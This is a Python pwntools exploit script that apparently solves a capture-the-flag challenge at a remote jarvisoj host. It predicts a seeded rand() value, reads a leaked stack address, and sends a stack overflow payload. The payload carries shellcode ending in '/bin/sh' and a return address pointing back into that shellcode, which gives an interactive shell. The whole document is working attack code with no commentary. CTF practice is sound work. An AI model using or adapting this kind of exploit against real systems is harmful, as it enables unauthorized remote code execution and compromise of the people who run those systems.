from pwn import *
from ctypes import CDLL

sh = remote("pwn2.jarvisoj.com", 9889)

dll = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
dll.srand(0x123456)
key = dll.rand()

sh.sendlineafter("help.\n", str(key))
sh.recvuntil("Your input was")
stack_addr = int(sh.recvline().strip(), 16)

buf =  b""
buf += b"\x66\x06\x06\x24\xff\xff\xd0\x04\xff\xff\x06\x28\xe0"
buf += b"\xff\xbd\x27\x01\x10\xe4\x27\x1f\xf0\x84\x24\xe8\xff"
buf += b"\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x27\xab\x0f\x02"
buf += b"\x24\x0c\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x00"

payload = '0'*4 + buf.ljust(0x70 - 4, '0') + p32(stack_addr + 4)

sh.sendline(payload)

sh.sendline('exit')

sh.interactive()
sh.close()
